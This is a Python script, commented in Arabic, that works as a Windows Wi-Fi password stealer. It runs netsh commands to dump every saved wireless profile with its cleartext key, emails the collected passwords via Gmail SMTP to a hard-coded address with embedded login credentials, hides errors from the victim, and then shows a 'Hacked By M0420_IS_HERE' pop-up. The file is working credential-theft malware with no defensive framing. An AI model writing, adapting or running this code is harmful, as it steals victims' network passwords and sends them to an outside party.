import subprocess
import smtplib
import re  # لاستخدام الـ Regular Expressions لاستخراج كلمات المرور
import ctypes  # لاستخدام دوال Windows API لظهور الرسالة المنبثقة


def send_mail(email, password, message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    except Exception as e:
        # يمكنك طباعة الخطأ للمراجعة أو تسجيله في ملف
        # print(f"Error sending email: {e}")
        pass  # تجاهل الأخطاء لمنع ظهورها للمستخدم


def show_message_box(title, message):
    # استخدام ctypes لاستدعاء MessageBoxA من user32.dll
    # MB_OK = 0x00000000L (زر موافق فقط)
    # MB_ICONEXCLAMATION = 0x00000030L (أيقونة تعجب)
    ctypes.windll.user32.MessageBoxA(0, message.encode('utf-8'), title.encode('utf-8'), 0x00000000L | 0x00000030L)


# 1. إعدادات الجيميل (استبدل بمعلوماتك الحقيقية التي حصلت عليها من App Password)
sender_email = "m0420.is.here@gmail.com"
sender_password = "M0420_IS_HERE@gmail.com"  # كلمة مرور التطبيق من 16 حرفًا

# 2. جلب أسماء شبكات Wi-Fi
command_profiles = "netsh wlan show profile"
profiles_output = subprocess.check_output(command_profiles, shell=True).decode('utf-8', errors='ignore')
profile_names = re.findall(r"All User Profile\s*:\s*(.*)\r\n", profiles_output)

wifi_passwords = ""
# 3. جلب كلمات المرور لكل شبكة
for name in profile_names:
    try:
        command_password = f"netsh wlan show profile \"{name}\" key=clear"
        password_output = subprocess.check_output(command_password, shell=True).decode('utf-8', errors='ignore')

        # البحث عن كلمة المرور (Key Content)
        password_match = re.search(r"Key Content\s*:\s*(.*)\r\n", password_output)

        if password_match:
            password = password_match.group(1).strip()
        else:
            password = "No key found (Open Network or not available)"

        wifi_passwords += f"Profile Name: {name}\nPassword: {password}\n\n"
    except Exception as e:
        wifi_passwords += f"Profile Name: {name}\nError: Could not retrieve password ({e})\n\n"

# 4. إرسال كلمات المرور عبر البريد الإلكتروني
if wifi_passwords:
    send_mail(sender_email, sender_password, wifi_passwords)

# 5. إظهار الرسالة المنبثقة
message_title = "Important Message"
message_text = "Hacked By M0420_IS_HERE"
show_message_box(message_title, message_text)